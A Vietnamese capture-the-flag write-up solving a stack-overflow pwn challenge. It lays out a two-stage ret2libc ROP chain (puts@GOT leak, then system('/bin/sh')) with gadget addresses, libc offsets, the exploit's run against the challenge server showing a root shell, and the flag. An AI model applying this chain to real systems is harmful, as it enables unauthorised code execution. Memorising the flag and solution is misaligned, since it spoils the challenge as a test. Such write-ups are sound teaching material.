# Parcel Bomb — Pwn (Medium)

**Flag:** `H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}`
**Remote:** `nc pwn.h7tex.com 41136`
**Files cung cấp:** `dispatch.zip` (1.03 MiB, sha256 `72f6e078…`). Bên trong bao gồm: `dispatch` (tệp thực thi ELF64 ET_EXEC, sha256 `d946ba60…`), thư viện `libc.so.6` (glibc 2.39-0ubuntu8.9), `ld-linux-x86-64.so.2` và tệp `README.txt`.

## Đề bài

Kết nối vào hệ thống, ta được chào đón bởi một cửa sổ dòng lệnh có tên "Sparrow Freight dispatch" (Tổng đài điều phối vận tải Sparrow). Nó yêu cầu nhập số vận đơn (waybill number) và thông báo đã ghi nhận. Cạm bẫy nằm ở chỗ: biến lưu trữ (buffer) chỉ có sức chứa 64 byte, nhưng lệnh `read` lại cho phép nuốt trọn tới 512 byte. Tuy nhiên, tệp nhị phân không hề được tác giả tốt bụng nhét sẵn hàm `system` hay chuỗi `/bin/sh`. Mục tiêu cuối cùng là chiếm quyền điều khiển và lấy cờ từ instance đang chạy.

## Phân tích ban đầu

Bắt mạch tệp thực thi:
```bash
$ node ~/.qoder/skills/ctf-solve/scripts/triage.cjs dispatch
class=64-bit type=ET_EXEC (no PIE)  entry=0x401090  PIE=no RELRO=yes STACK=non-exec

$ readelf --dyn-syms -W dispatch
puts  read  setvbuf  __libc_start_main  stdout
```
Đúng như dự đoán, không có bất kỳ dấu vết nào của `system` hay `execve`.

Dùng lệnh `objdump -d -M intel` quét qua, toàn bộ chương trình thô sơ đến mức chỉ có 3 đoạn mã đáng chú ý:

| Địa chỉ | Nội dung phân giải |
| --- | --- |
| `0x401176` | Một mảnh mã (gadget) nhúng sẵn: `pop rdi ; ret`, tại `0x401177` là `ret`. |
| `0x401178` | Hàm `vuln()` mang tội ác: `puts(prompt);` `read(0, rbp-0x40, 0x200);` `puts("waybill logged.");` `leave; ret`. |
| `0x4011bb` | Hàm `main()`: `setvbuf(stdout, NULL, _IONBF, 0);` `puts(banner);` `call vuln`. |

Khám nghiệm các hàng rào bảo vệ (Mitigations) từng cái một:

- **Canary:** Bị tắt. Bảng ký hiệu (symtab) không chứa hàm `__stack_chk_fail`. Vì vậy, lệnh `read` nạp 512 byte vào khoảng đệm 64 byte sẽ cán nát bét thanh ghi `saved rbp` và đè thẳng lên địa chỉ trả về (return address). Khoảng cách (offset) tính tới địa chỉ trả về là `0x40 + 8 = 72` byte.
- **PIE (Position Independent Executable):** Bị tắt. Do đó, toàn bộ các mảnh gadget và mọi slot trong bảng GOT đều nằm chình ình ở các địa chỉ hằng số cố định, không bị xáo trộn.
- **RELRO:** Bật tối đa (Full RELRO). Vùng `GNU_RELRO` đã bao phủ khoảng `0x403df8 + 0x208`, biến phân đoạn `.got` và `.got.plt` thành vùng nhớ chỉ đọc (read-only). Kỹ thuật ghi đè GOT (ret2got) chính thức đi vào ngõ cụt.
- **NX:** Bật. Không thể nhét shellcode trực tiếp lên ngăn xếp (stack) để thi hành.

Ngáng bạc cuối cùng: Chương trình không bao giờ phản hồi lại nội dung mà ta đã nạp vào buffer, đồng nghĩa với việc phát nổ tràn bộ đệm (overflow) đơn lẻ này không thể tự làm rò rỉ (leak) địa chỉ gốc của thư viện `libc`. Mà địa chỉ `libc` lại là chìa khoá vạn năng phải nắm được trong phạm vi 512 byte mà lệnh `read` cung cấp.

Băng rôn (banner) chào mừng trả về từ `pwn.h7tex.com:41136` khớp hoàn hảo từng byte với chuỗi trong tệp `dispatch`. Điều này xác nhận máy chủ đang chạy đúng phiên bản file mà ta đang cầm, nên việc phân tích tĩnh là dư sức (do máy phân tích chạy Win32 không có qemu/docker nên không thể chạy trực tiếp file ELF Linux).

## Chuỗi khai thác

### Bước 1: Kỹ thuật tự sinh lỗ rò (Leak) bằng ROP, phớt lờ libc base

Vì hàm `puts` đã được gọi từ trước để in chuỗi prompt, cơ chế Lazy Binding của hệ điều hành đã tự động giải mã (resolve) slot `puts@GOT` tại địa chỉ `0x404000` thành một con trỏ thực sự trỏ thẳng vào lòng thư viện `libc`. 
Chiến thuật là: Gọi ngược lại `puts@plt` và nhồi `rdi = 0x404000`. Khi đó, nó sẽ in ra trọn vẹn 6 byte của chính con trỏ đó (vì `stdout` đang cấu hình `_IONBF` không dùng bộ đệm nên dữ liệu phụt ra ngay lập tức). Sau khi lấy đồ xong, ta bắt luồng thực thi lộn về lại hàm `vuln` (`0x401178`) để bồi thêm cú overflow lần hai trên cùng một phiên kết nối. Nhờ tính năng No-PIE, cấu trúc stack lần hai rập khuôn y hệt lần một.

Chuỗi ROP ở giai đoạn 1 (Stage 1):
```text
pad(72 byte) | pop_rdi_ret | 0x404000 | ret | puts@plt | ret | 0x401178(vuln)
```

### Bước 2: Nắn lại khung stack (Căn chỉnh 16 byte)

Tại hàm `vuln`, giá trị thanh ghi `rsp` ngay thời điểm chui vào hàm luôn thõa mãn `≡ 8 (mod 16)` (có thể suy ngược từ lệnh `and rsp,-16` trong `_start` và `push rbp` trong `main`). 
Nhưng sau khi chạy qua cặp lệnh `leave; ret`, `rsp` sẽ bị kéo về `≡ 0`. Khổ nỗi, chuẩn giao tiếp ABI khắt khe đòi hỏi các hàm (callee) phải nhận được `rsp ≡ 8` ngay tại lệnh đầu tiên. Vì vậy:

- Bắt buộc phải chèn một lệnh `ret` (`0x401177`, xài ké luôn lệnh ở đuôi gadget `pop_rdi_ret`) ngay trước mỏm `puts@plt`. Nếu không có miếng đệm này, `puts` sẽ chạy trong tình trạng stack bị lệch 8 byte và lập tức chết đứng ăn cờ `SIGSEGV` tại lệnh xử lý vector `movaps`.
- Chuỗi payload stage 1 phải nạp ra số lượng qword (8 byte) chẵn. Với thiết kế 6 qword (48 byte), khi chui lại vào `vuln` lần hai, `rsp ≡ 8` sẽ chuẩn xác như lúc mới chạy, dẫn đến việc cả hàm `puts` bên trong `vuln` và hàm `system` ở stage 2 đều thoát được án tử `movaps` mà không cần đệm thêm `ret` nào nữa.
- Dựa trên nền tảng đó, chuỗi stage 2 cứ ngoan ngoãn giữ đúng khuôn: `pop_rdi_ret | tham_số | ret | hàm_đích`.

### Bước 3: Đốt tiền rò rỉ (Chi tiêu Leak)

```bash
$ python exploit.py pwn.h7tex.com 41136 "id; ls -la; cat flag flag.txt /flag /flag.txt 2>/dev/null; ls /"
[*] leaked bytes: c07c88edae7f0a (7)
[+] puts -> 0x7faeed887cc0, libc base = 0x7faeed800000
[*] post-exploitation output (1378 bytes):
waybill logged.
uid=0(root) gid=0(root) groups=0(root)
...
-rw-r--r--  1 root root   44 Sep 26 05:28 flag
H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
```

Bóc trần con số: `0x7faeed887cc0 - 0x87cc0 = 0x7faeed800000` (con số đuôi chẵn trang bộ nhớ, và phần đầu `0x7f…` nằm chuẩn xác trong vùng mmap). Từ file `libc.so.6` của đề, ta tra được offset của `system = base + 0x58750`, và chuỗi `"/bin/sh" = base + 0x1cc42f`.

Chuỗi ROP giai đoạn 2 (Stage 2):
```text
pad(72 byte) | pop_rdi_ret | base+0x1cc42f | ret | base+0x58750(system)
```

Khi hàm `system()` khởi động, nó tự động thừa kế luồng nhập/xuất stdin/stdout đang là một kết nối mạng (socket), biến nó thành một vỏ sò (shell) tương tác trực tiếp 1-1 trên đường truyền. Luồng shell này được chạy với quyền tối cao `uid=0` bên trong container. Tệp tin cờ đang ung dung nằm tại `/flag`.

Đặc biệt lưu ý: Cả hai quả bom payload này bắt buộc phải được nhồi vào **duy nhất một phiên kết nối**. Cơ chế ASLR của Linux sẽ nhào trộn (randomize) lại toàn bộ địa chỉ vùng nhớ ở mỗi lượt mở kết nối (trong 3 lần thử nghiệm, nó đã nhả ra 3 base lệch pha hoàn toàn: `0x7f57a5a00000`, `0x7f57c4c00000`, `0x7f3bfbc00000`). Vì vậy, giá trị leak chỉ có sinh mạng mỏng manh trong đúng cái connection nặn ra nó.

## Flag
```
H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
```

Lệnh chạy lại công cụ: `python exploit.py pwn.h7tex.com 41136 "cat /flag"`
